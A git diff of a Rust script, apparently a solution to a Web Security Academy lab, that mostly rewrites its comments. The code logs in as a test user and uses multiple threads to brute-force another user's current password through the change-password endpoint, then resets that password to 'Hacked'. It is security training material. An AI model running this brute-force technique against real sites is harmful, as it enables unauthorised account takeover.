@@ -39,43 +39,74 @@ use std::{
 };
 use text_colorizer::Colorize;
 
+/******************
+* Global variables
+*******************/
 lazy_static! {
     static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
     static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
 }
+
 /******************
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0aba002e036f2c5982898835006f006d.web-security-academy.net"; // change this to the url of your lab
-    let client = build_client(); // This client will be used in every request
+    // change this to your lab URL
+    let url = "https://0aba002e036f2c5982898835006f006d.web-security-academy.net";
 
-    let passwords_string = fs::read_to_string("/home/ahmed/passwords").unwrap(); // read all password in one string
-    let passwords: Vec<&str> = passwords_string.split('\n').collect(); // change this to \r\n if you still a windows user
-    let threads = 8; // how many threads will be used
-    let chunk_per_thread = passwords.len() / threads; // how many passwords will be tried in each thread
-    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect(); // split the whole list to sublist to run each one in a thread
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
-    let start_time = time::Instant::now(); // capture the time before brute forcing
+    // read password list as one string
+    // change the path to your password list
+    let passwords_string = fs::read_to_string("/home/ahmed/passwords").unwrap();
+
+    // split the big string to a list of passwords
+    // change the separator to \r\n if you still a windows user
+    let passwords: Vec<&str> = passwords_string.split('\n').collect();
+
+    // set number of threads
+    let threads = 8;
+
+    // how many passwords will be tried in each thread
+    let chunk_per_thread = passwords.len() / threads;
+
+    // split the whole list to sublist to run each one in a thread
+    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();
+
+    // capture the time before brute forcing
+    let start_time = time::Instant::now();
+
     println!(
         "{} {}..",
         "[#] Brute forcing password of".white().bold(),
         "carlos".green().bold()
     );
-    let new_password = "Hacked"; // change this to what you want
+
+    // set the new password
+    // change this to what you want
+    let new_password = "Hacked";
+
+    // get the password length
     let passwords_count = passwords.len();
+
+    // run every sublist in different thread
     passwords_chunks.par_iter().for_each(|minilist| {
+        // iterate over every password in the sublist
         for password in minilist.iter() {
+            // iterate only if no valid password is found
             if VALID_PASSWORD.lock().unwrap().len() == 0 {
-                // iterate only if no valid password is found
+                // try to make a successful login first
                 if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
-                    // try to make a successful login first
+                    // check the status code of the response
                     match login_res.status().as_u16() {
+                        // if a redirect happened which means login is successful
                         302 => {
-                            // login succeeded
-                            let session = extract_session_cookie(login_res); // get the valid session
+                            // extract session cookie
+                            let session = extract_session_cookie(login_res);
+
+                            // try to guess the current password based on change password functionality
                             let change_password = change_password(
-                                // try to guess the current password based on change password functionality
                                 &client,
                                 &format!("{url}/my-account/change-password"),
                                 &session,
@@ -83,10 +114,14 @@ fn main() {
                                 password,
                                 new_password,
                             );
+
+                            // if the request is successful
                             if let Ok(change_password_res) = change_password {
+                                // if the password is changed successfully
                                 if change_password_res.status().as_u16() == 200 {
-                                    // change password request succeeded
+                                    // update the global valid_password variable
                                     VALID_PASSWORD.lock().unwrap().push_str(password);
+
                                     println!(
                                         "\n[#] {} => {}",
                                         password.blue().bold(),
@@ -97,6 +132,7 @@ fn main() {
                                         "Password changed to".white().bold(),
                                         new_password.green().bold()
                                     );
+
                                     break;
                                 } else {
                                     // password are not correct
